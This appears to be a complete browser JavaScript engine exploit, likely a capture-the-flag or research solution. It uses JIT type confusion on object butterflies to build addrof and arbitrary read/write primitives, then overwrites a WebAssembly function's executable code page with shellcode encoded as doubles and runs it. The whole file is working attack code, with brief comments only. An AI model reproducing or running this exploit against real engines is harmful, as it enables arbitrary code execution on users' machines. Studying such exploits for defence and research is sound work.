var tmp_buf = new ArrayBuffer(8)
var f64 = new Float64Array(tmp_buf)
var u32 = new Uint32Array(tmp_buf)
var BASE = 0x100000000

function f2i(f) {
    f64[0] = f
    return u32[0] + BASE*u32[1]
}
function i2f(i) {
    u32[0] = i % BASE
    u32[1] = i / BASE
    return f64[0]
}
function hex(x) {
    if (x < 0) return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function jit(a, addr) {
    a.j = addr
}

let a = {x: 13.37, y: 26.6, z: 13.37, j: 13.37, k: 13.37}
let b = {x: 13.37, y: 26.6, 0: 13.37}
let c = {x: 27.37, y: 26.6, 0: 13.37}
let d = {x: 27.37, y: 26.6, 0: 13.37}

for(let i = 0; i < 100; i++){
    jit(a, {})
}
// Overwrite c's butterfly with d
jit(b, d)

// Create type confusion between d's first inline property and c's butterfly 
// -> interpret object as raw double
function addrof(obj) {
    d.x = obj
    return f2i(c[2])
}

// Arbitrary r/w by overwriting d's butterfly
function read(addr) {
    c[1] = i2f(addr)
    return f2i(d[0])
}

function write(addr, value) {
    c[1] = i2f(addr)
    d[0] = value
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main
var addr_f = addrof(f)
print("[*] f @ " + hex(addr_f))

var addr_shellcode = read(addr_f + 0x38)
print("[*] Shellcode @ " + hex(addr_shellcode))

let shellcode = [
    2.825563119134789e-71, 3.2060568105999132e-80,
    -2.5309726874116607e+35, 7.034840446283643e-309
]

for(var i = 0; i < shellcode.length; i++) {
    write(addr_shellcode + i*8, shellcode[i])
}

print("[*] Shellcode write done")

f()